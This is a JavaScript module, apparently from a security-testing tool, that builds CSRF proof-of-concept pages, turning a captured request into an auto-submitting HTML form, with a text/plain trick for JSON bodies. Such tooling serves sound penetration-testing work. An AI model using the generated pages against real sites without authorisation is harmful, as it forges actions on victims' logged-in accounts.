// CSRF PoC generator — pure, DOM-free core. Turns a request into a
// self-submitting HTML page so you can demonstrate whether an endpoint accepts
// a cross-site, cookie-authenticated request (i.e. is missing CSRF protection).
//
// DOM-free so it can be unit-tested under `node --test`.

function escapeAttr(value) {
  return String(value ?? '').replace(/[&<>"']/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])
  );
}

// Split a URL into its action (no query string) and decoded query params.
export function parseQuery(url) {
  const i = String(url).indexOf('?');
  if (i === -1) return { action: url, params: [] };
  const action = url.slice(0, i);
  const params = url
    .slice(i + 1)
    .split('&')
    .filter(Boolean)
    .map((pair) => {
      const eq = pair.indexOf('=');
      const k = eq === -1 ? pair : pair.slice(0, eq);
      const v = eq === -1 ? '' : pair.slice(eq + 1);
      return { name: decode(k), value: decode(v) };
    });
  return { action, params };
}

function decode(s) {
  try {
    return decodeURIComponent(String(s).replace(/\+/g, ' '));
  } catch {
    return s;
  }
}

// Parse an application/x-www-form-urlencoded body into fields.
export function parseFormBody(body) {
  if (!body) return [];
  return String(body)
    .split('&')
    .filter(Boolean)
    .map((pair) => {
      const eq = pair.indexOf('=');
      const k = eq === -1 ? pair : pair.slice(0, eq);
      const v = eq === -1 ? '' : pair.slice(eq + 1);
      return { name: decode(k), value: decode(v) };
    });
}

function headerValue(headers, name) {
  const target = name.toLowerCase();
  for (const [k, v] of Object.entries(headers || {})) {
    if (k.toLowerCase() === target) return v;
  }
  return undefined;
}

function formHtml(action, method, fields, enctype) {
  const inputs = fields
    .map((f) => `      <input type="hidden" name="${escapeAttr(f.name)}" value="${escapeAttr(f.value)}">`)
    .join('\n');
  const enc = enctype ? ` enctype="${enctype}"` : '';
  return [
    '<!doctype html>',
    '<html>',
    '  <body onload="document.forms[0].submit()">',
    `    <form action="${escapeAttr(action)}" method="${method}"${enc}>`,
    inputs,
    '    </form>',
    '  </body>',
    '</html>',
    '',
  ].join('\n');
}

// Build a CSRF PoC for a request: { method, url, headers, body }.
// Returns { html, notes } — notes flag conditions that make the PoC unreliable.
export function buildCsrfPoc(request) {
  const method = String(request.method || 'GET').toUpperCase();
  const headers = request.headers || {};
  const contentType = (headerValue(headers, 'content-type') || '').toLowerCase();
  const notes = [];

  if (headerValue(headers, 'authorization')) {
    notes.push(
      'Request carries an Authorization header — a browser form cannot set it, so this PoC only works if the app authenticates via cookies.'
    );
  }

  let html;
  if (method === 'GET') {
    const { action, params } = parseQuery(request.url);
    html = formHtml(action, 'GET', params, null);
  } else if (contentType.includes('json')) {
    // Browsers cannot send application/json from a form. The text/plain trick
    // submits the raw JSON as a single field; a trailing "=" is appended, which
    // many lenient parsers ignore. Only works if the endpoint accepts
    // text/plain (or sniffs the body) and tolerates the trailing "=".
    notes.push(
      'JSON body: using the text/plain form trick. It only fires if the endpoint accepts a text/plain content-type and tolerates a trailing "=". Otherwise use a fetch()-based PoC, which needs permissive CORS to matter.'
    );
    html = formHtml(request.url, 'POST', [{ name: request.body || '', value: '' }], 'text/plain');
  } else {
    // form-urlencoded (or unknown) — submit parsed fields as a normal form.
    html = formHtml(request.url, 'POST', parseFormBody(request.body), 'application/x-www-form-urlencoded');
  }

  return { html, notes };
}
